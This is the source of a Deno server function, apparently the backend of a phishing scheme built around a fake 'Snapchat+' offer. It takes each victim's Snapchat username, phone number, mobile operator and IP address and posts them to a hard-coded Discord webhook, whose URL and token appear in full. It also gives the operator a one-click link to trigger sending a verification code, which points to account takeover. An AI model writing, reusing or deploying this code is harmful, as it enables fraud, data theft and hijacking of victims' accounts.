import { createClientFromRequest } from 'npm:@base44/sdk@0.8.31';

const DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1513598405744787527/OfecKTmHVNK-0sUDt3f7n5PLo8qjUAkFgcOxtUZ95NKlzBqF_uSvfq7_9x1De-k9YxwW";

Deno.serve(async (req) => {
  const base44 = createClientFromRequest(req);
  const body = await req.json();
  const { snapchat, telephone, operateur, submissionId } = body;

  const ip = req.headers.get("x-forwarded-for")?.split(",")[0]?.trim() || "Inconnue";
  const operatorColors = { SFR: 16711680, Bouygues: 3447003, Orange: 16753920 };

  const now = new Date();
  const dateStr = now.toLocaleDateString("fr-FR", {
    weekday: "long", day: "numeric", month: "long", year: "numeric",
    hour: "2-digit", minute: "2-digit", second: "2-digit",
    timeZone: "Europe/Paris"
  });

  // Link to the frontend admin page — it has a useEffect that auto-triggers sendCode
  const appUrl = Deno.env.get("APP_URL") || "";
  const triggerUrl = `${appUrl}/admin?action=send_code&id=${submissionId}`;

  const embed = {
    title: "📱 Nouvelle soumission Snapchat+",
    color: operatorColors[operateur] || 16776960,
    fields: [
      { name: "👤 Utilisateur", value: `@${snapchat}`, inline: true },
      { name: "📡 Opérateur", value: operateur, inline: true },
      { name: "📞 Numéro", value: telephone, inline: true },
      { name: "🕵️ Adresse IP", value: `\`${ip}\``, inline: false },
      { name: "🕐 Date de soumission", value: dateStr, inline: false },
      {
        name: "⚡ Actions",
        value: `✅ [**Envoyer le code**](${triggerUrl})\n❌ **Mauvais numéro**\n⏳ **Faire patienter**`,
        inline: false
      },
    ],
    footer: { text: `ID: ${submissionId || "N/A"}` },
    timestamp: now.toISOString(),
  };

  await fetch(DISCORD_WEBHOOK, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({ embeds: [embed] }),
  });

  return Response.json({ ok: true });
});